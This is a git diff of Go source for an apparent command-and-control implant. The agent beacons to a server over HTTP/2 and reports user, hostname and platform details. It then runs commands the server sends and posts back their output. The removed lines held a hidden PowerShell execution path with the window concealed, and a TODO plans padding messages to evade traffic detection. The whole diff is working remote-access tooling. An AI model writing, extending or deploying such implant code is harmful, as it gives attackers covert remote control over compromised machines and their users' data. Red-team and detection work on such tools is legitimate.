@@ -13,9 +13,10 @@ import (
 	"github.com/satori/go.uuid"
 	"golang.org/x/net/http2"
 	"os/exec"
-	"syscall"
 	"../standard/messages"
 	"flag"
+	"runtime"
+	"strings"
 )
 
 //GLOBAL VARIABLES
@@ -26,6 +27,7 @@ var hostUUID = uuid.NewV4()
 var url = "https://127.0.0.1:443/"
 var h2Client = getH2WebClient()
 var waitTime = 30000 * time.Millisecond
+var agentShell = ""
 const agentVersion = "0.1 Beta"
 
 func main() {
@@ -61,6 +63,9 @@ func initialCheckIn(host string, client *http.Client) {
 
 	if VERBOSE {
 		color.Green("[+]Host Information:")
+		color.Green("\tAgent UUID: %s", hostUUID)
+		color.Green("\tPlatform: %s", runtime.GOOS)
+		color.Green("\tArchitecture: %s", runtime.GOARCH)
 		color.Green("\tUser Name: %s", u.Username)
 		color.Green("\tUser GUID: %s", u.Gid)
 		color.Green("\tHostname: %s", h)
@@ -69,6 +74,8 @@ func initialCheckIn(host string, client *http.Client) {
 
 	//JSON "initial" payload object
 	i := messages.SysInfo{
+		Platform: runtime.GOOS,
+		Architecture: runtime.GOARCH,
 		UserName: u.Username,
 		UserGUID: u.Gid,
 		HostName: h,
@@ -88,11 +95,25 @@ func initialCheckIn(host string, client *http.Client) {
 	b := new(bytes.Buffer)
 	json.NewEncoder(b).Encode(g)
 	color.Yellow("[-]Connecting to web server at %s for initial check in.", host)
-	resp, _ := client.Post(host, "application/json; charset=utf-8", b)
+	resp, err := client.Post(host, "application/json; charset=utf-8", b)
+
+	if err != nil && DEBUG {
+		color.Red("[!]There was an error with the HTTP client while performing a POST:")
+		fmt.Println(err)
+		os.Exit(1)
+	}
 
 	if DEBUG {
 		color.Red("[DEBUG]HTTP Response:")
 		color.Red("[DEBUG]%s", resp)
+	}
+
+	if resp.StatusCode != 200 {
+		if VERBOSE {
+			color.Yellow("There was an error communicating with the server!")
+			color.Yellow("Recieved HTTP Status Code: %d", resp.StatusCode)
+		}
+		os.Exit(1)
 	}
 }
 
@@ -110,12 +131,18 @@ func statusCheckIn(host string, client *http.Client) {
 		color.Yellow("[-]Connecting to web server at %s for status check in.", host)
 	}
 
-	resp, _ := client.Post(host, "application/json; charset=utf-8", b)
+	resp, err := client.Post(host, "application/json; charset=utf-8", b)
+
+	if err != nil && DEBUG {
+		color.Red("[!]There was an error with the HTTP Response")
+		fmt.Println(err)
+		return
+	}
 
 	if DEBUG {
 		color.Red("%s", "[DEBUG]HTTP Response:")
+		color.Red("ContentLength: %s", resp.ContentLength)
 		color.Red("%s", resp)
-		color.Red("ContentLength: %d", resp.ContentLength)
 	}
 
 	if resp.ContentLength > 0 {
@@ -139,24 +166,25 @@ func statusCheckIn(host string, client *http.Client) {
 		case "CmdPayload":
 			var p messages.CmdPayload
 			json.Unmarshal(payload, &p)
-			result := executeCommand(p)
+			stdout, stderr := executeCommand(p)
 
-			c := messages.PSResults{
+			c := messages.CmdResults{
 				Job: p.Job,
-				Result: result,
+				Stdout: stdout,
+				Stderr: stderr,
 			}
 
 			k, _ := json.Marshal(c)
 			g := messages.Base{
 				Version: 1.0,
 				ID:      j.ID,
-				Type:    "PSResults",
+				Type:    "CmdResults",
 				Payload: (*json.RawMessage)(&k),
 			}
 			b2 := new(bytes.Buffer)
 			json.NewEncoder(b2).Encode(g)
 			if VERBOSE {
-				color.Yellow("Sending response to server: %s", result)
+				color.Yellow("Sending response to server: %s", stdout)
 			}
 			resp2, _ := client.Post(host, "application/json; charset=utf-8", b2)
 			if resp2.StatusCode != 200 {
@@ -177,7 +205,7 @@ func statusCheckIn(host string, client *http.Client) {
 				if VERBOSE {
 					color.Yellow("[-]Recieved Agent Kill Message")
 				}
-				os.Exit(1)
+				os.Exit(0)
 			}
 		default:
 			color.Red("Recieved unrecognized message type: %s", j.Type)
@@ -209,23 +237,44 @@ func getH2WebClient() *http.Client {
 	return client
 }
 
-func executeCommand(j messages.CmdPayload) string{
+func executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
 	if DEBUG {
 		color.Red("[DEBUG]Recieved input parameter for executeCommand function: %s", j)
 
 	} else if VERBOSE {
-		color.Green("Executing command cmd.exe /c %s", j.Command)
+		color.Green("Executing command %s %s", agentShell, j.Command)
 	}
 
-	//cmd := exec.Command("cmd.exe", "/c", j.Command)
-	cmd := exec.Command("powershell.exe", "-nop", "-w", "hidden", "-c", j.Command)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	out, _ := cmd.Output();
-	if VERBOSE {
-		color.Green("Command output:\r\n\r\n%s", out)
+	var cmd *exec.Cmd
+
+	if len(j.Args) > 0 {
+		cmd = exec.Command(j.Command, strings.Fields(j.Args)...)
+	} else {
+		cmd = exec.Command(j.Command)
 	}
-	return string(out)
-	//sendResult(j)
+
+	//if runtime.GOOS == "windows" {
+	//	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	//}
+
+	out, err := cmd.CombinedOutput();
+	stdout = string(out);
+	stderr = "";
+
+	if err != nil {
+		stderr = err.Error();
+		if VERBOSE{
+			color.Red("[!]There was an error executing the command: %s", j.Command)
+			color.Red("Error: %s", err.Error())
+			color.Red(string(out))
+		}
+	} else {
+		if VERBOSE{
+			color.Green("Command output:\r\n\r\n%s", out)
+		}
+	}
+
+	return stdout, stderr //TODO return if the output was stdout or stderr and color stderr red on server
 }
 
 func usage() {
@@ -246,3 +295,4 @@ func usage() {
 
 // TODO add error checking for when server can't be reached
 // TODO add cert stapling
+// TODO add random sized data to keep the overall message size from being constant
